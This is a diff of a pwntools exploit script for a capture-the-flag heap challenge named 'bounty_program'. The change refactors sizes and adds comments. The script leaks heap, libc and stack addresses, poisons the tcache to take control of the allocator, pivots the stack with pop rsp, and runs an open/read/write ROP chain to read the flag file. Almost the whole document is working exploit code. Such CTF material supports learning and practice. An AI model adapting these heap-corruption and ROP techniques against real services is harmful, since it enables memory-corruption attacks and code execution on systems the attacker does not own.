@@ -37,7 +37,7 @@ e = context.binary = ELF('./bounty_program_patched', checksec=False)
 libc = ELF('./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so', checksec=False)
 ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
 
-TERMINAL = 1
+TERMINAL = 3
 USE_PTY = True
 GDB_ATTACH_DELAY = 1
 
@@ -176,15 +176,14 @@ def DeleteReport(product_id, bug_id):
     slan(p, b'Bug ID', bug_id)
 
 username = password = b'ngtuonghung'
-desc_min_size = 0x408
-desc_min_size_hi = 0x410
-desc_min_size_lo = 0x400
+ub_size = 0x420
+tcache_size = 0x240
 
 attempt = 0
 while True:
     attempt += 1
     print("\n----------> Attempt", attempt)
-
+    
     p = conn()
 
     if not args.LOCAL:
@@ -199,8 +198,8 @@ while True:
     slan(p, b'choice', 1)
 
     print("Leaking heap address")
-    AddVulnType(0x240, b'A', 0)
-    AddVulnType(0x240, b'B', 0) # This only works since calloc skip tcache
+    AddVulnType(tcache_size, b'A', 0)
+    AddVulnType(tcache_size, b'B', 0) # This only works since calloc skip tcache
     slan(p, b'choice', 2)
     slan(p, b'Size', -1)
     sa(p, b'Type', b'0')
@@ -217,7 +216,7 @@ while True:
     print("We're lucky this time")
 
     print("Leaking libc address")
-    AddVulnType(0x420, b'C', 0)
+    AddVulnType(ub_size, b'C', 0)
     slan(p, b'choice', 2)
     slan(p, b'Size', -1)
     sa(p, b'Type', b'0')
@@ -225,43 +224,56 @@ while True:
     libc.address = leak_bytes(b'\0' + rn(p, 5), 0x3ec000)
     lg("libc base", libc.address)
 
-    RemoveVulnType(0x420, b'XSS')
-    RemoveVulnType(0x420, b'DoS')
-    RemoveVulnType(0x420, b'A')
-    RemoveVulnType(0x420, b'B')
-    RemoveVulnType(0x420, b'C')
-
-    # AddVulnType(0x420, b'A' * 0x5f, 0)
-    # AddVulnType(0x420, b'B' * 0x5f, 0)
+    # Clear types to create more
+    RemoveVulnType(ub_size, b'XSS')
+    RemoveVulnType(ub_size, b'DoS')
+    RemoveVulnType(ub_size, b'A')
+    RemoveVulnType(ub_size, b'B')
+    RemoveVulnType(ub_size, b'C')
 
     AddNewProduct(b'iphone 18 pro max vip premium', b'4pple', b'A')
     SubmitBugReport(0, 0, b'A', 0, 0x2000-0x130, b'A')
 
-    AddVulnType(0x420, A(0x210-1), 0) # clear unsortedbin
+    # Clear unsortedbin
+    AddVulnType(ub_size, A(0x210-1), 0)
 
-    # tcache poisoning to control tcache
-    RemoveVulnType(0x240, b'A')
+    # Allocatae chunk ends with 0x2c10 and free it to tcache bin 0x250
+    RemoveVulnType(tcache_size, b'A')
+
+    # Overwrite 0x2c with null, works since calloc() skip tcache
     AddVulnType(0x240, b'\0', -1)
     slan(p, b'choice', 2)
     slan(p, b'Size', -1)
     sa(p, b'Type', b'\0')
     slan(p, b'Price', 0)
 
+    # Remove type to create more
+    RemoveVulnType(ub_size, A(0x210-1))
 
-    RemoveVulnType(0x420, A(0x210-1)) # remove 1 type for another
-    AddVulnType(0x420, A(0x23f), 0) # take 1 from tcache entry
-    AddVulnType(0x420, b'B' * 0x23f, 0) # take tcache address out
-    RemoveVulnType(0x420, b'B' * 0x23f) # put in unsortedbin
+    # Take 1 chunk from tcache 0x250 using strdup()
+    AddVulnType(ub_size, A(tcache_size - 1), 0)
+    # Allocate at 0x0010 using strdup()
+    AddVulnType(ub_size, b'B' * (tcache_size - 1), 0)
+    # Free to put in unsortedbin for later calloc()
+    RemoveVulnType(ub_size, b'B' * (tcache_size - 1))
 
-    RemoveVulnType(0x420, b'RCE')
-    RemoveVulnType(0x420, A(0x23f))
+    # Remove types to create more
+    RemoveVulnType(ub_size, b'RCE')
+    RemoveVulnType(ub_size, A(tcache_size - 1))
 
+    # Control tcache
     tcache = TcachePerthread()
-    tcache.set_count(0x250, 0)
-    tcache.set_entry(0x20, heap_base + 0xce8) # bug description
-    AddVulnType(0x240, tcache.pack()[:0x23f], -1) # allocate again control whole tcache
+    tcache.set_count(tcache_size + 0x10, 0)
+    # Overwrite bug description pointer to environ to leak stack
+    desc = heap_base + 0xce8
+    tcache.set_entry(0x20, desc)
 
-    AddVulnType(0x420, A(0x10) + p64(libc.symbols['__environ']), 0) # environ to bug description to leak stack
+    AddVulnType(tcache_size, tcache.pack()[:tcache_size - 1], -1)
+
+    print("Leaking stack address")
+    environ = libc.symbols['__environ']
+    lg("environ", environ)
+    AddVulnType(ub_size, flat(A(0x10), environ), 0)
 
     ShowBugDetail(0)
 
@@ -269,29 +281,30 @@ while True:
     stack = leak_bytes(rn(p, 6))
     lg("stack", stack)
 
-    # control tcache again
-    AddVulnType(0x420, b'B' * 0x23f, 0)
-    RemoveVulnType(0x420, b'B' * 0x23f)
+    # Control entire tcache again using the same trick above
+    AddVulnType(ub_size, b'B' * (tcache_size - 1), 0)
+    RemoveVulnType(ub_size, b'B' * (tcache_size - 1))
 
     tcache = TcachePerthread()
+    # Prevent freeing to unsortedbin to avoid corruption
     tcache.set_count(0x250, 0)
+    # To write pop rsp into return address of Bounty()
     tcache.set_entry(0x30, stack - 0x128)
+    # To write rsp value after pop rsp
     tcache.set_entry(0x20, stack - 0x108)
-    AddVulnType(0x240, tcache.pack()[:0x23f], -1)
+    AddVulnType(0x240, tcache.pack()[:tcache_size - 1], -1)
 
-    print("ORW ROP")
     pop_rax = libc.address + 0x00000000000439c8
     pop_rdi = libc.address + 0x000000000002155f
     pop_rsi = libc.address + 0x0000000000023e6a
     pop_rdx = libc.address + 0x0000000000001b96
-    pop_r10 = libc.address + 0x00000000001306b5
-    pop_r8_mov_eax_1 = libc.address + 0x0000000000155fc6
+    pop_rsp = libc.address + 0x000000000011bd7c
     syscall = libc.address + 0x00000000000d2975
     
-    flag_path = heap_base + 0x3260 + 0xd8
+    ROP_chain_addr = heap_base + 0x3260
+    flag_path = ROP_chain_addr + 0xd8
     flag_buf = flag_path + 0x20
 
-    # ROP execveat() ko dc?? :v
     ROP_chain = flat(
         # open("/home/bounty_program/flag", 0, 0)
         pop_rdi, flag_path,
@@ -316,17 +329,19 @@ while True:
 
         b'/home/bounty_program/flag\0'
     )
-
+    # Write ROP chain onto heap
     SubmitBugReport(0, 0, b'A', 0, 0x100, ROP_chain)
 
     attach(p)
     sleep(0.5)
-    AddVulnType(0x420, p64(heap_base + 0x3260),0)
 
-    AddVulnType(0x420, A(24) + p64(libc.address + 0x000000000011bd7c),0)
+    # Stack pivot to heap to execute ROP chain
+    AddVulnType(ub_size, p64(ROP_chain_addr),0)
+    AddVulnType(ub_size, flat(A(0x18), pop_rsp),0)
 
+    # Capture the flag
     slan(p, b'Your choice', 0)
 
-    print(ra(p, 2))
+    print(f'Flag: {ra(p, 2)}')
     p.close()
     break
